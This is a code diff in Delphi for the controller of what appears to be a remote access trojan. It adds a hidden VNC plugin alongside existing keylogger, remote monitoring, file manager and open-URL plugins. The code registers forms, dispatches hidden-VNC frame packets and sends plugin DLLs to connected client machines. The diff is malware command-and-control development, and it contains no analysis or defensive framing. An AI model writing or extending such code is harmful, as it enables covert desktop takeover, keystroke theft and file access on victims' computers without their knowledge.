@@ -14,7 +14,8 @@ uses
   UnitRemoteMonitoring,
   UnitKeylogger,
   UnitOpenURL,
-  UnitFileManager;
+  UnitFileManager,
+  UnitHiddenVNC;
 
 const
   INFORMATION_PLUGIN_ID       = 'InformationPlugin';
@@ -24,12 +25,14 @@ const
   KEYLOGGER_PLUGIN_ID         = 'KeyloggerPlugin';
   OPEN_URL_PLUGIN_ID          = 'OpenURLPlugin';
   FILE_MANAGER_PLUGIN_ID      = 'FileManagerPlugin';
+  HIDDEN_VNC_PLUGIN_ID        = 'HiddenVNCPlugin';
   MAX_JSON_BUFFER_SIZE        = 128 * 1024 * 1024;
   PACKET_TYPE_JSON            = $01;
   PACKET_TYPE_DLL             = $02;
   PACKET_TYPE_MONITOR_FRAME   = $03;
   PACKET_TYPE_FILE_UPLOAD     = $04;
   PACKET_TYPE_FILE_DOWNLOAD   = $05;
+  PACKET_TYPE_HVNC_FRAME      = $06;
   MONITOR_FRAME_FORMAT_JPEG   = 1;
 
 type
@@ -78,6 +81,7 @@ type
   TMonitoringReceivedEvent  = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TKeyloggerReceivedEvent   = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TFileManagerReceivedEvent = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
+  THVNCReceivedEvent        = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TLogEvent                 = procedure(Category: TLogCategory; const Msg: string) of object;
 
   TServerManager = class
@@ -92,6 +96,7 @@ type
     FKeyloggerForms   : TDictionary<TncLine, TForm7>;
     FOpenURLForms     : TDictionary<TncLine, TForm8>;
     FFileManagerForms : TDictionary<TncLine, TForm9>;
+    FHiddenVNCForms   : TDictionary<TncLine, TForm10>;
     FReadBuffers      : TDictionary<TncLine, TBytes>;
     FHeartbeatTimer   : TTimer;
     FIsStopping       : Boolean;
@@ -105,6 +110,7 @@ type
     FOnMonitoringReceived : TMonitoringReceivedEvent;
     FOnKeyloggerReceived  : TKeyloggerReceivedEvent;
     FOnFileManagerReceived: TFileManagerReceivedEvent;
+    FOnHVNCReceived       : THVNCReceivedEvent;
     FOnLog                : TLogEvent;
 
     procedure OnConnected   (Sender: TObject; aLine: TncLine);
@@ -113,6 +119,7 @@ type
                              const aBuf: TBytes; aBufCount: Integer);
     procedure ProcessJSONMessage(aLine: TncLine; const RawStr: string);
     procedure ProcessMonitoringBinaryFrame(aLine: TncLine; const Payload: TBytes);
+    procedure ProcessHVNCBinaryFrame(aLine: TncLine; const Payload: TBytes);
     procedure ProcessFileManagerBinaryPacket(aLine: TncLine; PacketType: Byte; const Payload: TBytes);
     procedure OnHeartbeat(Sender: TObject);
     procedure DisconnectLine(aLine: TncLine);
@@ -124,6 +131,7 @@ type
     procedure DetachKeyloggerForms;
     procedure DetachOpenURLForms;
     procedure DetachFileManagerForms;
+    procedure DetachHiddenVNCForms;
 
   public
     constructor Create(aServer: TncTCPServer);
@@ -141,6 +149,7 @@ type
     procedure SendKeyloggerPlugin(aLine: TncLine);
     procedure SendOpenURLPlugin(aLine: TncLine);
     procedure SendFileManagerPlugin(aLine: TncLine);
+    procedure SendHiddenVNCPlugin(aLine: TncLine);
 
     function  TryGetClientInfo(aLine: TncLine; out Info: TClientInfo): Boolean;
     function  IsActive   : Boolean;
@@ -174,6 +183,10 @@ type
     procedure UnregisterFileManagerForm(aLine: TncLine);
     function  GetFileManagerForm       (aLine: TncLine): TForm9;
 
+    procedure RegisterHiddenVNCForm  (aLine: TncLine; AForm: TForm10);
+    procedure UnregisterHiddenVNCForm(aLine: TncLine);
+    function  GetHiddenVNCForm       (aLine: TncLine): TForm10;
+
     property OnClientConnected    : TClientEvent              read FOnClientConnected     write FOnClientConnected;
     property OnClientUpdated      : TClientEvent              read FOnClientUpdated       write FOnClientUpdated;
     property OnClientDisconnected : TClientRemoveEvent        read FOnClientDisconnected  write FOnClientDisconnected;
@@ -183,6 +196,7 @@ type
     property OnMonitoringReceived : TMonitoringReceivedEvent  read FOnMonitoringReceived  write FOnMonitoringReceived;
     property OnKeyloggerReceived  : TKeyloggerReceivedEvent   read FOnKeyloggerReceived   write FOnKeyloggerReceived;
     property OnFileManagerReceived: TFileManagerReceivedEvent read FOnFileManagerReceived write FOnFileManagerReceived;
+    property OnHVNCReceived       : THVNCReceivedEvent        read FOnHVNCReceived        write FOnHVNCReceived;
     property OnLog                : TLogEvent                 read FOnLog                 write FOnLog;
   end;
 
@@ -234,6 +248,7 @@ begin
   FKeyloggerForms   := TDictionary<TncLine, TForm7>.Create;
   FOpenURLForms     := TDictionary<TncLine, TForm8>.Create;
   FFileManagerForms := TDictionary<TncLine, TForm9>.Create;
+  FHiddenVNCForms   := TDictionary<TncLine, TForm10>.Create;
   FReadBuffers      := TDictionary<TncLine, TBytes>.Create;
 
   FServer.OnConnected    := OnConnected;
@@ -257,7 +272,9 @@ begin
   DetachKeyloggerForms;
   DetachOpenURLForms;
   DetachFileManagerForms;
+  DetachHiddenVNCForms;
   FReadBuffers.Free;
+  FHiddenVNCForms.Free;
   FFileManagerForms.Free;
   FOpenURLForms.Free;
   FKeyloggerForms.Free;
@@ -298,6 +315,7 @@ begin
   FOnMonitoringReceived := nil;
   FOnKeyloggerReceived  := nil;
   FOnFileManagerReceived:= nil;
+  FOnHVNCReceived       := nil;
   FOnLog                := nil;
 
   if FServer.Active then
@@ -570,6 +588,41 @@ begin
   end;
 end;
 
+procedure TServerManager.RegisterHiddenVNCForm(aLine: TncLine; AForm: TForm10);
+begin
+  FLock.Enter;
+  try
+    FHiddenVNCForms.AddOrSetValue(aLine, AForm);
+  finally
+    FLock.Leave;
+  end;
+end;
+
+procedure TServerManager.UnregisterHiddenVNCForm(aLine: TncLine);
+var
+  AForm: TForm10;
+begin
+  FLock.Enter;
+  try
+    if FHiddenVNCForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
+      AForm.DetachCallbacks;
+    FHiddenVNCForms.Remove(aLine);
+  finally
+    FLock.Leave;
+  end;
+end;
+
+function TServerManager.GetHiddenVNCForm(aLine: TncLine): TForm10;
+begin
+  FLock.Enter;
+  try
+    if not FHiddenVNCForms.TryGetValue(aLine, Result) then
+      Result := nil;
+  finally
+    FLock.Leave;
+  end;
+end;
+
 procedure TServerManager.DetachProcessForms;
 var
   AForm: TForm4;
@@ -580,6 +633,21 @@ begin
       if Assigned(AForm) then
         AForm.DetachCallbacks;
     FProcessForms.Clear;
+  finally
+    FLock.Leave;
+  end;
+end;
+
+procedure TServerManager.DetachHiddenVNCForms;
+var
+  AForm: TForm10;
+begin
+  FLock.Enter;
+  try
+    for AForm in FHiddenVNCForms.Values do
+      if Assigned(AForm) then
+        AForm.DetachCallbacks;
+    FHiddenVNCForms.Clear;
   finally
     FLock.Leave;
   end;
@@ -854,6 +922,11 @@ begin
   SendPlugin(aLine, FILE_MANAGER_PLUGIN_ID);
 end;
 
+procedure TServerManager.SendHiddenVNCPlugin(aLine: TncLine);
+begin
+  SendPlugin(aLine, HIDDEN_VNC_PLUGIN_ID);
+end;
+
 { --- Server Olaylari --- }
 
 procedure TServerManager.OnConnected(Sender: TObject; aLine: TncLine);
@@ -900,6 +973,7 @@ var
   KeyloggerForm   : TForm7;
   OpenURLForm     : TForm8;
   FileManagerForm : TForm9;
+  HiddenVNCForm   : TForm10;
 begin
   IP := aLine.PeerIP;
   FLock.Enter;
@@ -927,6 +1001,9 @@ begin
     if FFileManagerForms.TryGetValue(aLine, FileManagerForm) and Assigned(FileManagerForm) then
       FileManagerForm.DetachCallbacks;
     FFileManagerForms.Remove(aLine);
+    if FHiddenVNCForms.TryGetValue(aLine, HiddenVNCForm) and Assigned(HiddenVNCForm) then
+      HiddenVNCForm.DetachCallbacks;
+    FHiddenVNCForms.Remove(aLine);
   finally
     FLock.Leave;
   end;
@@ -1049,6 +1126,8 @@ begin
     begin
       if BP.PacketType = PACKET_TYPE_MONITOR_FRAME then
         ProcessMonitoringBinaryFrame(aLine, BP.Payload)
+      else if BP.PacketType = PACKET_TYPE_HVNC_FRAME then
+        ProcessHVNCBinaryFrame(aLine, BP.Payload)
       else if BP.PacketType = PACKET_TYPE_FILE_DOWNLOAD then
         ProcessFileManagerBinaryPacket(aLine, BP.PacketType, BP.Payload);
     end;
@@ -1086,6 +1165,37 @@ begin
   MonitoringForm := GetMonitoringForm(aLine);
   if Assigned(MonitoringForm) then
     MonitoringForm.QueueFrameBytes(FrameBytes);
+end;
+
+procedure TServerManager.ProcessHVNCBinaryFrame(aLine: TncLine; const Payload: TBytes);
+var
+  FrameHeader   : TMonitorFramePayloadHeader;
+  FrameBytes    : TBytes;
+  HeaderSize    : Integer;
+  HVNCForm      : TForm10;
+begin
+  HeaderSize := SizeOf(TMonitorFramePayloadHeader);
+  if Length(Payload) < HeaderSize then
+    Exit;
+
+  Move(Payload[0], FrameHeader, HeaderSize);
+  // Reuse TMonitorFramePayloadHeader for HVNC frames
+  if FrameHeader.Format <> MONITOR_FRAME_FORMAT_JPEG then
+    Exit;
+
+  if (FrameHeader.DataSize = 0) or
+     (Integer(FrameHeader.DataSize) <> (Length(Payload) - HeaderSize)) then
+    Exit;
+
+  SetLength(FrameBytes, FrameHeader.DataSize);
+  Move(Payload[HeaderSize], FrameBytes[0], FrameHeader.DataSize);
+
+  if Length(FrameBytes) = 0 then
+    Exit;
+
+  HVNCForm := GetHiddenVNCForm(aLine);
+  if Assigned(HVNCForm) then
+    HVNCForm.QueueFrameBytes(FrameBytes);
 end;
 
 procedure TServerManager.ProcessFileManagerBinaryPacket(aLine: TncLine; PacketType: Byte; const Payload: TBytes);
@@ -1164,8 +1274,30 @@ begin
           SendOpenURLPlugin(aLine)
         else if SameText(PluginID, FILE_MANAGER_PLUGIN_ID) then
           SendFileManagerPlugin(aLine)
+        else if SameText(PluginID, HIDDEN_VNC_PLUGIN_ID) then
+          SendHiddenVNCPlugin(aLine)
         else
           SendPlugin(aLine, PluginID);
+      end;
+      Exit;
+    end;
+
+    if (Action = 'hvnc_response') or (Action = 'hvnc_status') or (Action = 'hvnc_error') then
+    begin
+      DoLog(lcCommand, '"' + Action + '" received from ' + IP);
+      if Assigned(FOnHVNCReceived) then
+      begin
+        var JSONClone    := TJSONObject(JSONObj.Clone);
+        var CapturedLine := aLine;
+        var CB           := FOnHVNCReceived;
+        QueueToUI(procedure
+        begin
+          try
+            CB(CapturedLine, JSONClone);
+          finally
+            JSONClone.Free;
+          end;
+        end);
       end;
       Exit;
     end;
